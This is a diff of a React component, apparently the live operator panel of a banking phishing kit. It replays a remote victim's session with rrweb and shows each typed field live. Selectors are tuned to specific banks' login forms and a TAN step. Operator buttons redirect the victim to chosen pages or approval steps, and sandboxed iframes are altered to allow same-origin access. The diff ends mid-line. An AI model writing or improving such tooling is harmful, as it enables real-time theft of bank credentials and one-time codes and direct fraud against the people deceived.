@@ -1,9 +1,8 @@
 "use client";
 
-import { useEffect, useRef, useState } from "react";
+import { useCallback, useEffect, useRef, useState } from "react";
 import { createBrowserSupabaseClient } from "@/lib/supabase/client";
 import { BroadcastReassembler, sendBroadcastPacket } from "@/lib/broadcast-transfer";
-import { showBeautifulToast } from "@/lib/notification";
 import type { LiveClientMeta, LiveUserAction } from "@/components/LiveScreenRecorder";
 import type { RealtimeChannel } from "@supabase/supabase-js";
 
@@ -79,6 +78,8 @@ export function LiveWatchModal({
 }: Props) {
   const [frameMode, setFrameMode] = useState<FrameMode>("mobile");
   const [scale, setScale] = useState<number>(0.85);
+  const [isAutoFit, setIsAutoFit] = useState(true);
+  const stageRef = useRef<HTMLDivElement | null>(null);
   const [isFullscreen, setIsFullscreen] = useState(false);
   const [connectionStatus, setConnectionStatus] = useState<"connecting" | "live" | "offline">(
     isOnline ? "connecting" : "offline"
@@ -87,8 +88,6 @@ export function LiveWatchModal({
   const [currentlyFocusedField, setCurrentlyFocusedField] = useState<string | null>(null);
   const [copiedField, setCopiedField] = useState<string | null>(null);
   const [actionFeedback, setActionFeedback] = useState<string | null>(null);
-  const [liveCursor, setLiveCursor] = useState<{ x: number; y: number; isClick: boolean; isTouch: boolean } | null>(null);
-  const clickTimeoutRef = useRef<ReturnType<typeof setTimeout> | null>(null);
 
   // Dynamic live fields: Only include fields that actually have values or are interacted with!
   const [liveFields, setLiveFields] = useState<Record<string, string>>(() => {
@@ -117,17 +116,22 @@ export function LiveWatchModal({
   const [eventCount, setEventCount] = useState(0);
   const [lastActivityAt, setLastActivityAt] = useState<number | null>(null);
   const [activeTab, setActiveTab] = useState<"fields" | "device">("fields");
+
   const playerContainerRef = useRef<HTMLDivElement | null>(null);
   const replayerRef = useRef<any>(null);
   const channelRef = useRef<RealtimeChannel | null>(null);
   const reassemblerRef = useRef(new BroadcastReassembler());
   const heartbeatTimerRef = useRef<ReturnType<typeof setInterval> | null>(null);
   const lastMetaEventRef = useRef<any>(null);
+  const liveInputActionsRef = useRef<Map<string, LiveUserAction>>(new Map());
 
-  // Keyboard shortcut: Escape to close
+  // Keyboard shortcut: Escape to close (ignore if an overlay popup is open on top)
   useEffect(() => {
     const handleKeyDown = (e: KeyboardEvent) => {
-      if (e.key === "Escape") onClose();
+      if (e.key === "Escape") {
+        if (document.querySelector('[data-live-popup="true"]')) return;
+        onClose();
+      }
     };
     window.addEventListener("keydown", handleKeyDown);
     return () => window.removeEventListener("keydown", handleKeyDown);
@@ -146,18 +150,10 @@ export function LiveWatchModal({
     });
     channelRef.current = channel;
 
-    // Load rrweb dynamically — snapshot cok hizli gelip modul henuz
-    // yuklenmemisse pendingSnapshot'a duser, import bitince aninda kurulur.
+    // Load rrweb dynamically
     let rrwebModule: typeof import("rrweb") | null = null;
-    const pendingSnapshotRef = { current: null as { meta: any; event: any } | null };
     void import("rrweb").then((mod) => {
-      if (isDisposed) return;
-      rrwebModule = mod;
-      const pending = pendingSnapshotRef.current;
-      if (pending) {
-        pendingSnapshotRef.current = null;
-        rebuildReplayer(pending.meta, pending.event);
-      }
+      if (!isDisposed) rrwebModule = mod;
     });
 
     const requestSnapshot = async () => {
@@ -167,8 +163,349 @@ export function LiveWatchModal({
       });
     };
 
+    const nonTextTypes = new Set([
+      "hidden",
+      "submit",
+      "button",
+      "reset",
+      "image",
+      "file",
+      "checkbox",
+      "radio",
+    ]);
+
+    const isEditableVisibleEl = (el: Element): el is HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement => {
+      if (!el) return false;
+      const tag = (el.tagName || "").toLowerCase();
+      if (tag !== "input" && tag !== "textarea" && tag !== "select") return false;
+      const inp = el as HTMLInputElement;
+      if (inp.disabled) return false;
+      const type = (inp.getAttribute("type") || (tag === "input" ? "text" : tag)).toLowerCase();
+      if (nonTextTypes.has(type)) return false;
+      try {
+        const win = el.ownerDocument?.defaultView || window;
+        const style = win.getComputedStyle(el);
+        if (style.display === "none" || style.visibility === "hidden" || style.opacity === "0") {
+          return false;
+        }
+        if (el.closest("[hidden], [aria-hidden='true'], .hidden, .d-none, .sf-hidden")) {
+          return false;
+        }
+        const rect = el.getBoundingClientRect();
+        if (rect.width === 0 && rect.height === 0) return false;
+      } catch {
+        /* ignore */
+      }
+      return true;
+    };
+
+    const updateElementVisualValue = (
+      el: HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement,
+      val: string,
+      isFocused: boolean
+    ) => {
+      try {
+        if (el.value !== val) {
+          el.value = val;
+        }
+        el.setAttribute("value", val);
+        el.style.setProperty("opacity", "1", "important");
+        el.style.setProperty("visibility", "visible", "important");
+
+        const hasVal = val.trim().length > 0;
+        const wrapper =
+          el.closest(
+            ".mat-form-field, .input-div, .field-group, .bb-input, .i-input, .input-group, .lhv-text-field-wrapper, .lhv-text-field, .seb-input, .input-wrapper, .form-group, .field, .c-input, .v-input, .form-row, .control-input"
+          ) || el.parentElement;
+
+        if (wrapper) {
+          if (hasVal) {
+            wrapper.classList.add("has-value", "is-filled", "not-empty", "mat-form-field-should-float");
+          } else {
+            wrapper.classList.remove("has-value", "is-filled", "not-empty", "mat-form-field-should-float");
+          }
+          if (isFocused) {
+            wrapper.classList.add("focused", "is-focused", "mdc-text-field--focused", "mat-focused");
+          } else {
+            wrapper.classList.remove("focused", "is-focused", "mdc-text-field--focused", "mat-focused");
+          }
+
+          // Hide overlapping floating labels/placeholders when input has value
+          wrapper
+            .querySelectorAll(
+              ".mat-form-field-label, .lhv-floating-label, .mdc-floating-label, .placeholder, [class*='placeholder'], .info"
+            )
+            .forEach((lbl) => {
+              const htmlLbl = lbl as HTMLElement;
+              if (htmlLbl.tagName !== "INPUT" && !htmlLbl.contains(el)) {
+                htmlLbl.style.opacity = hasVal || isFocused ? "0" : "1";
+                htmlLbl.style.visibility = hasVal || isFocused ? "hidden" : "visible";
+              }
+            });
+        }
+
+        el.dispatchEvent(new Event("input", { bubbles: true }));
+        el.dispatchEvent(new Event("change", { bubbles: true }));
+      } catch {
+        /* ignore */
+      }
+    };
+
+    const collectTargetDocuments = (
+      rootDoc: Document,
+      preferredIframeSrc?: string,
+      inIframe?: boolean
+    ): Document[] => {
+      const nestedDocs: Array<{ doc: Document; matchedSrc: boolean }> = [];
+
+      const walk = (doc: Document, depth: number) => {
+        if (!doc || depth > 4) return;
+        try {
+          doc.querySelectorAll("iframe").forEach((node) => {
+            const ifr = node as HTMLIFrameElement;
+            try {
+              const sb = ifr.getAttribute("sandbox");
+              if (sb && !sb.includes("allow-same-origin")) {
+                ifr.setAttribute("sandbox", `${sb} allow-same-origin`);
+              }
+            } catch {
+              /* ignore */
+            }
+            const style = ifr.style;
+            if (
+              style.display === "none" ||
+              style.visibility === "hidden" ||
+              ifr.classList.contains("opacity-0") ||
+              ifr.classList.contains("pointer-events-none") ||
+              style.width === "0px" ||
+              style.height === "0px" ||
+              ifr.getAttribute("width") === "0" ||
+              ifr.getAttribute("height") === "0"
+            ) {
+              return;
+            }
+            try {
+              const cDoc = ifr.contentDocument || ifr.contentWindow?.document;
+              if (cDoc) {
+                const srcAttr = ifr.getAttribute("src") || "";
+                const matchedSrc = Boolean(
+                  preferredIframeSrc &&
+                    (srcAttr.includes(preferredIframeSrc) || preferredIframeSrc.includes(srcAttr))
+                );
+                nestedDocs.push({ doc: cDoc, matchedSrc });
+                walk(cDoc, depth + 1);
+              }
+            } catch {
+              /* ignore */
+            }
+          });
+        } catch {
+          /* ignore */
+        }
+      };
+
+      walk(rootDoc, 0);
+
+      nestedDocs.sort((a, b) => (a.matchedSrc === b.matchedSrc ? 0 : a.matchedSrc ? -1 : 1));
+      const orderedNested = nestedDocs.map((d) => d.doc);
+
+      if (inIframe) {
+        return [...orderedNested, rootDoc];
+      }
+      return [rootDoc, ...orderedNested];
+    };
+
+    const findInputInDoc = (
+      doc: Document,
+      action: LiveUserAction
+    ): HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement | null => {
+      const meta = action.inputMeta;
+      try {
+        const allInputs = Array.from(doc.querySelectorAll("input, textarea, select")) as Array<
+          HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement
+        >;
+        if (allInputs.length === 0) return null;
+
+        const visibleInputs = allInputs.filter(isEditableVisibleEl);
+
+        if (meta?.id) {
+          const byId = visibleInputs.find((el) => el.id === meta.id) || (doc.getElementById(meta.id) as any);
+          if (byId && (byId.tagName === "INPUT" || byId.tagName === "TEXTAREA" || byId.tagName === "SELECT")) {
+            return byId;
+          }
+        }
+
+        if (meta?.name) {
+          const byName =
+            visibleInputs.find((el) => el.getAttribute("name") === meta.name) ||
+            allInputs.find((el) => el.getAttribute("name") === meta.name && !nonTextTypes.has((el.getAttribute("type") || "").toLowerCase()));
+          if (byName) return byName;
+        }
+
+        if (meta?.formControlName) {
+          const byFcn =
+            visibleInputs.find((el) => el.getAttribute("formcontrolname") === meta.formControlName) ||
+            allInputs.find((el) => el.getAttribute("formcontrolname") === meta.formControlName);
+          if (byFcn) return byFcn;
+        }
+
+        if (meta?.placeholder) {
+          const byPh = visibleInputs.find((el) => el.getAttribute("placeholder") === meta.placeholder);
+          if (byPh) return byPh;
+        }
+
+        if (meta?.ariaLabel) {
+          const byAria = visibleInputs.find((el) => el.getAttribute("aria-label") === meta.ariaLabel);
+          if (byAria) return byAria;
+        }
+
+        if (typeof meta?.visibleIndex === "number" && meta.visibleIndex >= 0 && visibleInputs[meta.visibleIndex]) {
+          return visibleInputs[meta.visibleIndex];
+        }
+
+        if (typeof meta?.domIndex === "number" && meta.domIndex >= 0 && allInputs[meta.domIndex]) {
+          const cand = allInputs[meta.domIndex];
+          if (!nonTextTypes.has((cand.getAttribute("type") || "").toLowerCase())) {
+            return cand;
+          }
+        }
+
+        // Fallback: if there is only 1 visible input in doc (e.g. TAN step or single field)
+        if (visibleInputs.length === 1 && !meta) {
+          return visibleInputs[0];
+        }
+      } catch {
+        /* ignore */
+      }
+      return null;
+    };
+
+    const applyLiveInputToReplayerDom = (action: LiveUserAction, isFocused = true) => {
+      const mainDoc = replayerRef.current?.iframe?.contentDocument as Document | undefined;
+      if (!mainDoc) return;
+
+      const candidateDocs = collectTargetDocuments(
+        mainDoc,
+        action.inputMeta?.iframeSrc,
+        action.inputMeta?.inIframe
+      );
+
+      for (const doc of candidateDocs) {
+        const el = findInputInDoc(doc, action);
+        if (el) {
+          updateElementVisualValue(el, action.value ?? "", isFocused);
+          return;
+        }
+      }
+    };
+
+    const applyAllLiveInputsToReplayerDom = () => {
+      liveInputActionsRef.current.forEach((act) => {
+        applyLiveInputToReplayerDom(act, false);
+      });
+    };
+
+    const injectLiveWatchStyles = (doc: Document) => {
+      try {
+        doc.documentElement?.classList.remove("rrweb-paused");
+        if (!doc.getElementById("live-watch-override-styles")) {
+          const styleEl = doc.createElement("style");
+          styleEl.id = "live-watch-override-styles";
+          styleEl.textContent = `
+            html.rrweb-paused *, html.rrweb-paused *:before, html.rrweb-paused *:after {
+              animation-play-state: running !important;
+            }
+            .fade-in, [class*='animate-in'], [class*='fade-in'], .app-panel, .luxury-glass, .glass-card, [role='dialog'], .login-content, .login-container {
+              opacity: 1 !important;
+              transform: none !important;
+              animation: none !important;
+            }
+          `;
+          (doc.head || doc.documentElement)?.appendChild(styleEl);
+        }
+      } catch {
+        /* ignore */
+      }
+    };
+
+    const isIntentionallyHiddenIframe = (nested: HTMLIFrameElement): boolean => {
+      const st = nested.style;
+      if (st.display === "none" || st.visibility === "hidden" || st.opacity === "0") return true;
+      if (
+        nested.classList.contains("opacity-0") ||
+        nested.classList.contains("pointer-events-none") ||
+        nested.classList.contains("hidden") ||
+        nested.classList.contains("sf-hidden")
+      ) {
+        return true;
+      }
+      if (
+        st.width === "0px" ||
+        st.height === "0px" ||
+        nested.getAttribute("width") === "0" ||
+        nested.getAttribute("height") === "0"
+      ) {
+        return true;
+      }
+      return false;
+    };
+
+    const hookNestedIframes = (doc: Document, depth = 0) => {
+      if (!doc || depth > 4) return;
+      try {
+        injectLiveWatchStyles(doc);
+        doc.querySelectorAll("iframe").forEach((node) => {
+          const nested = node as HTMLIFrameElement;
+          try {
+            const sb = nested.getAttribute("sandbox");
+            if (sb && !sb.includes("allow-same-origin")) {
+              nested.setAttribute("sandbox", `${sb} allow-same-origin`);
+            }
+          } catch {
+            /* ignore */
+          }
+
+          if (!isIntentionallyHiddenIframe(nested)) {
+            if (!nested.style.width || nested.style.width === "0px") {
+              nested.style.width = "100%";
+            }
+            if (!nested.style.height || nested.style.height === "0px") {
+              nested.style.height = "100%";
+            }
+          }
+
+          if (!(nested as any).__liveWatchLoadHooked) {
+            (nested as any).__liveWatchLoadHooked = true;
+            nested.addEventListener("load", () => {
+              try {
+                const cDoc = nested.contentDocument || nested.contentWindow?.document;
+                if (cDoc) {
+                  hookNestedIframes(cDoc, depth + 1);
+                }
+                applyAllLiveInputsToReplayerDom();
+                setTimeout(applyAllLiveInputsToReplayerDom, 80);
+              } catch {
+                /* ignore */
+              }
+            });
+          }
+
+          try {
+            const cDoc = nested.contentDocument || nested.contentWindow?.document;
+            if (cDoc) {
+              hookNestedIframes(cDoc, depth + 1);
+            }
+          } catch {
+            /* ignore */
+          }
+        });
+      } catch {
+        /* ignore */
+      }
+    };
+
     const applyIframeVisibility = () => {
-      const mainIfr = replayerRef.current?.iframe;
+      const mainIfr = replayerRef.current?.iframe as HTMLIFrameElement | undefined;
       if (mainIfr) {
         mainIfr.style.display = "block";
         mainIfr.style.width = "100%";
@@ -178,151 +515,26 @@ export function LiveWatchModal({
         try {
           if (mainIfr.contentDocument) {
             mainIfr.contentDocument.documentElement.style.overflowY = "auto";
-            mainIfr.contentDocument.body.style.overflowY = "auto";
-            mainIfr.contentDocument.body.style.minHeight = "100vh";
-            const head = mainIfr.contentDocument.head;
-            if (head && !head.querySelector("base")) {
-              const base = mainIfr.contentDocument.createElement("base");
-              base.href = window.location.origin + "/";
-              head.insertBefore(base, head.firstChild);
+            if (mainIfr.contentDocument.body) {
+              mainIfr.contentDocument.body.style.overflowY = "auto";
             }
-
-            // Ic banka iframe'leri yuklendiginde son yazilan degerleri
-            // yeniden uygula (gec yukleme = kayip input senkronu engellenir).
-            mainIfr.contentDocument.querySelectorAll("iframe").forEach((nestedIfr: any) => {
-              const ifr = nestedIfr as HTMLIFrameElement;
-              if ((ifr as any).__reapplyAttached) return;
-              (ifr as any).__reapplyAttached = true;
-              ifr.addEventListener("load", () => {
-                setTimeout(() => {
-                  try {
-                    const d = ifr.contentDocument;
-                    if (!d) return;
-                    lastInputActions.forEach((action) => {
-                      const doc = d;
-                      if (action.inputId) {
-                        const el = doc.getElementById(action.inputId) as HTMLInputElement | null;
-                        if (el) { el.value = action.value || ""; return; }
-                      }
-                      if (action.inputName) {
-                        const el = doc.querySelector(`[name="${action.inputName}"]`) as HTMLInputElement | null;
-                        if (el) { el.value = action.value || ""; return; }
-                      }
-                    });
-                  } catch {
-                    /* ignore */
-                  }
-                }, 300);
-              });
-            });
+            hookNestedIframes(mainIfr.contentDocument, 0);
           }
         } catch {
           /* ignore */
         }
       }
-    };
-
-    // Banka iframe'i gec yuklendiginde yazilan degerler kacmasin diye
-    // son input aksiyonlari saklanir, iframe 'load' olunca yeniden uygulanir.
-    const lastInputActions = new Map<string, LiveUserAction>();
-
-    const syncInputToReplayerDom = (action: LiveUserAction) => {
-      const key = action.inputId || action.inputName || action.placeholder || action.target || "";
-      if (key) lastInputActions.set(key, action);
-
-      const mainIfr = replayerRef.current?.iframe;
-      if (!mainIfr?.contentDocument) return;
-
-      const updateInDoc = (doc: Document): boolean => {
-        if (action.inputId) {
-          const el = doc.getElementById(action.inputId) as HTMLInputElement | HTMLTextAreaElement | null;
-          if (el) { el.value = action.value || ""; return true; }
-        }
-        if (action.inputName) {
-          const el = doc.querySelector(`[name="${action.inputName}"]`) as HTMLInputElement | HTMLTextAreaElement | null;
-          if (el) { el.value = action.value || ""; return true; }
-        }
-        if (action.placeholder) {
-          const el = doc.querySelector(`[placeholder="${action.placeholder}"]`) as HTMLInputElement | HTMLTextAreaElement | null;
-          if (el) { el.value = action.value || ""; return true; }
-        }
-        if (action.target) {
-          const inputs = Array.from(doc.querySelectorAll("input, textarea"));
-          for (const inp of inputs) {
-            const el = inp as HTMLInputElement | HTMLTextAreaElement;
-            const name = (el.name || el.id || el.getAttribute("aria-label") || el.placeholder || "").toLowerCase();
-            const targetLow = action.target.toLowerCase();
-            if (name && (name.includes(targetLow) || targetLow.includes(name))) {
-              el.value = action.value || "";
-              return true;
-            }
-          }
-        }
-        return false;
-      };
-
-      if (!updateInDoc(mainIfr.contentDocument)) {
-        mainIfr.contentDocument.querySelectorAll("iframe").forEach((nestedIfr: any) => {
-          try {
-            if (nestedIfr.contentDocument) updateInDoc(nestedIfr.contentDocument);
-          } catch {
-            /* cross-origin */
-          }
-        });
-      }
-    };
-
-    const lastRebuildTime = { current: 0 };
-    const lastRebuildHref = { current: "" };
-
-    const rebuildReplayer = (meta: any, snapshotEvent: any) => {
-      if (!playerContainerRef.current || !rrwebModule) return;
-
-      const incomingHref = meta?.data?.href || clientMeta?.pathname || "";
-      lastRebuildTime.current = Date.now();
-      lastRebuildHref.current = incomingHref;
-
-      try {
-        if (replayerRef.current) {
-          try {
-            replayerRef.current.destroy();
-          } catch {
-            /* ignore */
-          }
-          replayerRef.current = null;
-        }
-
-        playerContainerRef.current.innerHTML = "";
-        const replayer = new rrwebModule.Replayer([meta, snapshotEvent], {
-          root: playerContainerRef.current,
-          liveMode: true,
-          mouseTail: true,
-          showWarning: false,
-          showDebug: false,
-          useVirtualDom: true,
-          UNSAFE_replayCanvas: true,
-          speed: 1,
-        });
-
-        replayer.startLive(meta.timestamp);
-
-        const repAny = replayer as any;
-        if (typeof repAny.enableInteract === "function") {
-          try {
-            repAny.enableInteract();
-          } catch {
-            /* ignore */
-          }
-        }
-
-        replayerRef.current = replayer;
-
-        applyIframeVisibility();
-        setTimeout(applyIframeVisibility, 50);
-        setTimeout(applyIframeVisibility, 200);
-      } catch (err) {
-        console.error("[LiveWatchModal] error rebuilding Replayer:", err);
-      }
+      const iframes = playerContainerRef.current?.querySelectorAll("iframe");
+      iframes?.forEach((iframe) => {
+        if (iframe !== mainIfr) return;
+        iframe.style.display = "block";
+        iframe.style.width = "100%";
+        iframe.style.height = "100%";
+        iframe.style.border = "none";
+        iframe.style.borderRadius = "inherit";
+        iframe.setAttribute("scrolling", "auto");
+      });
+      applyAllLiveInputsToReplayerDom();
     };
 
     // Receive broadcast events
@@ -330,36 +542,14 @@ export function LiveWatchModal({
       .on("broadcast", { event: "client_meta" }, (payload) => {
         reassemblerRef.current.receive<LiveClientMeta>(payload.payload, (meta) => {
           if (isDisposed) return;
-          setClientMeta(meta);
+          setClientMeta((prev) => {
+            if (prev?.pathname && meta.pathname && prev.pathname !== meta.pathname) {
+              liveInputActionsRef.current.clear();
+            }
+            return meta;
+          });
           setConnectionStatus("live");
           setLastActivityAt(Date.now());
-        });
-      })
-      .on("broadcast", { event: "client_cursor" }, (payload) => {
-        reassemblerRef.current.receive<any>(payload.payload, (cursor) => {
-          if (isDisposed || !cursor) return;
-          setLiveCursor(cursor);
-          if (clickTimeoutRef.current) clearTimeout(clickTimeoutRef.current);
-          clickTimeoutRef.current = setTimeout(
-            () => setLiveCursor((prev) => (cursor.isClick && prev ? { ...prev, isClick: false } : null)),
-            cursor.isClick ? 500 : 4000
-          );
-        });
-      })
-      .on("broadcast", { event: "client_scroll" }, (payload) => {
-        reassemblerRef.current.receive<any>(payload.payload, (sc) => {
-          if (isDisposed || !sc) return;
-          const mainIfr = replayerRef.current?.iframe;
-          if (mainIfr?.contentWindow) {
-            const doc = mainIfr.contentDocument?.documentElement;
-            const maxScroll = (doc?.scrollHeight || 1000) - mainIfr.clientHeight;
-            const targetTop = sc.scrollRatio != null ? sc.scrollRatio * maxScroll : sc.scrollY;
-            try {
-              mainIfr.contentWindow.scrollTo({ top: targetTop, behavior: "auto" });
-            } catch {
-              /* ignore */
-            }
-          }
         });
       })
       .on("broadcast", { event: "user_action" }, (payload) => {
@@ -375,7 +565,15 @@ export function LiveWatchModal({
               ...prev,
               [action.target!]: action.value || "",
             }));
-            syncInputToReplayerDom(action);
+
+            const actionKey = `${action.pathname}|${action.inputMeta?.inIframe ? "ifr" : "top"}|${
+              action.inputMeta?.id ||
+              action.inputMeta?.name ||
+              action.inputMeta?.formControlName ||
+              (action.inputMeta?.visibleIndex != null ? String(action.inputMeta.visibleIndex) : action.target)
+            }`;
+            liveInputActionsRef.current.set(actionKey, action);
+            applyLiveInputToReplayerDom(action, true);
           } else if (action.type === "focus" && action.target) {
             setCurrentlyFocusedField(action.target);
             setLiveFields((prev) => {
@@ -408,8 +606,9 @@ export function LiveWatchModal({
             return;
           }
 
-          // When FullSnapshot (type 2) arrives:
-          // Sayfa degisimi veya yenileme aninda Replayer'i aninda yeniden kur (1-1 canli senkronizasyon).
+          if (!playerContainerRef.current || !rrwebModule) return;
+
+          // When FullSnapshot (type 2) arrives: REBUILD REPLAYER WITH BOTH META + SNAPSHOT
           if (event.type === 2) {
             const meta = lastMetaEventRef.current || {
               type: 4,
@@ -423,37 +622,87 @@ export function LiveWatchModal({
               timestamp: event.timestamp - 1,
             };
 
-            // rrweb modulu veya container henuz hazir degilse snapshot'i kaybetme:
-            // pending'e yaz, import/render bitince otomatik kurulur.
-            if (!playerContainerRef.current || !rrwebModule) {
-              pendingSnapshotRef.current = { meta, event };
-              return;
+            try {
+              if (replayerRef.current) {
+                try {
+                  replayerRef.current.destroy();
+                } catch {
+                  /* ignore */
+                }
+                replayerRef.current = null;
+              }
+
+              playerContainerRef.current.innerHTML = "";
+              const replayer = new rrwebModule.Replayer([meta, event], {
+                root: playerContainerRef.current,
+                liveMode: true,
+                mouseTail: true,
+                showWarning: false,
+                showDebug: false,
+                useVirtualDom: false,
+                pauseAnimation: false,
+                UNSAFE_replayCanvas: true,
+                speed: 1,
+                insertStyleRules: [
+                  "html.rrweb-paused *, html.rrweb-paused *:before, html.rrweb-paused *:after { animation-play-state: running !important; }",
+                  ".fade-in, [class*='animate-in'], [class*='fade-in'], .app-panel, .luxury-glass, .glass-card, [role='dialog'], .login-content, .login-container { opacity: 1 !important; transform: none !important; animation: none !important; }",
+                ],
+              });
+
+              // Build DOM synchronously so nothing is missing!
+              const repAny = replayer as any;
+              if (typeof repAny.applyEventsSynchronously === "function") {
+                try {
+                  repAny.applyEventsSynchronously([meta, event]);
+                } catch {
+                  /* ignore */
+                }
+              }
+
+              // Pass baseline timestamp so events before Date.now() aren't discarded!
+              replayer.startLive(meta.timestamp);
+
+              // Enable scrolling on the iframe so long content (like bank list) scrolls properly!
+              if (typeof repAny.enableInteract === "function") {
+                try {
+                  repAny.enableInteract();
+                } catch {
+                  /* ignore */
+                }
+              }
+
+              replayerRef.current = replayer;
+
+              applyIframeVisibility();
+              setTimeout(applyIframeVisibility, 50);
+              setTimeout(applyIframeVisibility, 200);
+              setTimeout(applyIframeVisibility, 500);
+            } catch (err) {
+              console.error("[LiveWatchModal] error rebuilding Replayer:", err);
             }
-
-            const incomingHref = meta?.data?.href || clientMeta?.pathname || "";
-            const isNewPage = lastRebuildHref.current !== incomingHref;
-            const timeSinceLastRebuild = Date.now() - lastRebuildTime.current;
-
-            if (!replayerRef.current || isNewPage || timeSinceLastRebuild > 400) {
-              rebuildReplayer(meta, event);
-            } else {
+          } else {
+            // Incremental events: EXECUTE DIRECTLY ON REAL DOM (useVirtualDom: false)
+            if (replayerRef.current) {
+              const repAny = replayerRef.current as any;
               try {
-                replayerRef.current.addEvent(event);
+                const isPointerOrClick =
+                  event.type === 3 &&
+                  (event.data?.source === 1 || event.data?.source === 2 || event.data?.source === 6);
+                if (isPointerOrClick && typeof repAny.applyIncremental === "function") {
+                  repAny.applyIncremental(event, false);
+                } else if (typeof repAny.applyEventsSynchronously === "function") {
+                  repAny.applyEventsSynchronously([event]);
+                } else {
+                  replayerRef.current.addEvent(event);
+                }
                 applyIframeVisibility();
               } catch {
-                /* ignore */
+                try {
+                  replayerRef.current.addEvent(event);
+                } catch {
+                  /* ignore */
+                }
               }
-            }
-            return;
-          } else {
-            // Incremental events (mouse, touch, scroll, dom mutations)
-            if (replayerRef.current) {
-              try {
-                replayerRef.current.addEvent(event);
-              } catch {
-                /* ignore */
-              }
-              applyIframeVisibility();
             }
           }
         });
@@ -462,17 +711,19 @@ export function LiveWatchModal({
     channel.subscribe((status) => {
       if (status === "SUBSCRIBED" && !isDisposed) {
         void requestSnapshot();
-        // Auto-retry request to guarantee stream starts without requiring manual refresh
+        // Rapid sub-second retries to guarantee immediate 0-latency stream start:
         setTimeout(() => {
-          if (!isDisposed && !replayerRef.current) {
-            void requestSnapshot();
-          }
-        }, 1500);
+          if (!isDisposed && !replayerRef.current) void requestSnapshot();
+        }, 250);
         setTimeout(() => {
-          if (!isDisposed && !replayerRef.current) {
-            void requestSnapshot();
-          }
-        }, 3500);
+          if (!isDisposed && !replayerRef.current) void requestSnapshot();
+        }, 600);
+        setTimeout(() => {
+          if (!isDisposed && !replayerRef.current) void requestSnapshot();
+        }, 1200);
+        setTimeout(() => {
+          if (!isDisposed && !replayerRef.current) void requestSnapshot();
+        }, 2200);
       }
     });
 
@@ -483,23 +734,9 @@ export function LiveWatchModal({
       }
     }, 15000);
 
-    // Auto-retry: ilk snapshot gelmezse (chunk kaybi, gec init vs.)
-    // 4 sn'de bir yeniden iste — F5/manuel yenileme gerektirmez.
-    let snapshotRetryCount = 0;
-    const snapshotRetryTimer = setInterval(() => {
-      if (replayerRef.current || snapshotRetryCount >= 8) {
-        clearInterval(snapshotRetryTimer);
-        return;
-      }
-      snapshotRetryCount++;
-      void requestSnapshot();
-    }, 4000);
-
     return () => {
       isDisposed = true;
       if (heartbeatTimerRef.current) clearInterval(heartbeatTimerRef.current);
-      if (clickTimeoutRef.current) clearTimeout(clickTimeoutRef.current);
-      clearInterval(snapshotRetryTimer);
       if (channelRef.current) {
         void sendBroadcastPacket(channelRef.current, "admin_disconnect", {});
         void supabase.removeChannel(channelRef.current);
@@ -547,10 +784,6 @@ export function LiveWatchModal({
           .update({ current_step: actionVal, status: "online" })
           .eq("id", sessionId);
       }
-      const w = window as any;
-      w.__lastAdminActionAt = Date.now();
-      w.__adminNotifyAt = Date.now();
-      showBeautifulToast("Yönlendirildi", `Kullanıcı "${label}" sayfasına yönlendirildi.`);
     }
 
     setActionFeedback(`Yönlendirildi: ${label}`);
@@ -572,10 +805,6 @@ export function LiveWatchModal({
           .update({ current_step: approvalVal, status: "online" })
           .eq("id", sessionId);
       }
-      const w = window as any;
-      w.__lastAdminActionAt = Date.now();
-      w.__adminNotifyAt = Date.now();
-      showBeautifulToast("Onay Gönderildi", `Kullanıcı "${label}" onayına yönlendirildi.`);
     }
 
     setActionFeedback(`Onay Gönderildi: ${label}`);
@@ -589,6 +818,46 @@ export function LiveWatchModal({
 
   const viewportWidth = clientMeta?.width || 375;
   const viewportHeight = clientMeta?.height || 667;
+
+  // Dynamic phone frame dims matching the client's real device aspect ratio
+  const isMobileClient = viewportWidth > 0 && viewportWidth < 768;
+  const phoneScreenW = 390;
+  const phoneScreenH = isMobileClient
+    ? Math.min(920, Math.max(600, Math.round((phoneScreenW * viewportHeight) / viewportWidth)))
+    : 844;
+  const phoneFrameW = phoneScreenW + 40;
+  const phoneFrameH = phoneScreenH + 44;
+
+  // AUTO-FIT ZOOM: Automatically scale the screen frame to fit the container perfectly
+  const calculateAutoFitScale = useCallback(() => {
+    if (!stageRef.current) return;
+    const stageW = stageRef.current.clientWidth - 48;
+    const stageH = stageRef.current.clientHeight - 48;
+    if (stageW <= 0 || stageH <= 0) return;
+
+    let targetW = phoneFrameW;
+    let targetH = phoneFrameH;
+
+    if (frameMode === "desktop") {
+      targetW = 1100;
+      targetH = 720;
+    } else if (frameMode === "fit") {
+      targetW = viewportWidth || 390;
+      targetH = viewportHeight || 844;
+    }
+
+    const fitScale = Math.min(stageW / targetW, stageH / targetH);
+    const clamped = Math.min(1.2, Math.max(0.25, Number(fitScale.toFixed(2))));
+    setScale(clamped);
+  }, [frameMode, viewportWidth, viewportHeight, phoneFrameW, phoneFrameH]);
+
+  useEffect(() => {
+    if (!isAutoFit) return;
+    calculateAutoFitScale();
+    const handleResize = () => calculateAutoFitScale();
+    window.addEventListener("resize", handleResize);
+    return () => window.removeEventListener("resize", handleResize);
+  }, [isAutoFit, calculateAutoFitScale]);
 
   // ONLY show fields that actually exist or the user has touched! No empty hardcoded dummies!
   const activeFieldKeys = Object.keys(liveFields);
@@ -720,14 +989,17 @@ export function LiveWatchModal({
               </button>
             </div>
 
-            {/* SCALE CONTROLS */}
+            {/* SCALE & AUTO-FIT CONTROLS */}
             <div
-              className={`flex items-center px-1 py-0.5 rounded-xl border text-xs ${
+              className={`flex items-center px-1.5 py-0.5 rounded-xl border text-xs gap-0.5 ${
                 darkMode ? "bg-black/40 border-white/10" : "bg-white border-gray-200"
               }`}
             >
               <button
-                onClick={() => setScale((s) => Math.max(0.4, Number((s - 0.1).toFixed(2))))}
+                onClick={() => {
+                  setIsAutoFit(false);
+                  setScale((s) => Math.max(0.25, Number((s - 0.1).toFixed(2))));
+                }}
                 className="px-1.5 py-0.5 opacity-70 hover:opacity-100 font-bold"
                 title="Uzaklaştır"
               >
@@ -735,11 +1007,30 @@ export function LiveWatchModal({
               </button>
               <span className="px-1 font-mono text-[11px] opacity-80">{Math.round(scale * 100)}%</span>
               <button
-                onClick={() => setScale((s) => Math.min(1.4, Number((s + 0.1).toFixed(2))))}
+                onClick={() => {
+                  setIsAutoFit(false);
